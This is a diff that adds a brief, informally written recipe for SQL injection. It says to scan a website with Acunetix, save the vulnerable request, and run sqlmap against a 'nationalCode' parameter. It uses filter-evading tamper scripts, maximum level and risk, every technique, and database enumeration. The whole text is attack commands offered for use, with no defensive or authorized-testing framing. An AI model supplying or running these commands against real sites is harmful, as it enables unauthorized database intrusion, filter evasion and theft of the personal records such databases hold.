@@ -1,0 +1,21 @@
+1 : scan  your website with acunetix
+
+2 : save the vulnerability request and delete the payload in request the save it as txt file
+
+3 : use the below command
+
+sqlmap -r Hi.txt -p nationalCode --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST --dbs
+
+4 : -r  after this put your txt file ( i told in 2 ) , -p means the vulnerability parameter
+
+_______________________________________________________________________________________________________________________________________________
+
+if you just want to find the vulnerability parameter use the below command
+
+
+sqlmap -r Hi.txt --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST
+
+
+Then for gathering database 
+
+sqlmap -r Hi.txt --tamper="between,randomcase,space2comment" --level 5 --risk 3 --technique=BEUST --dbs
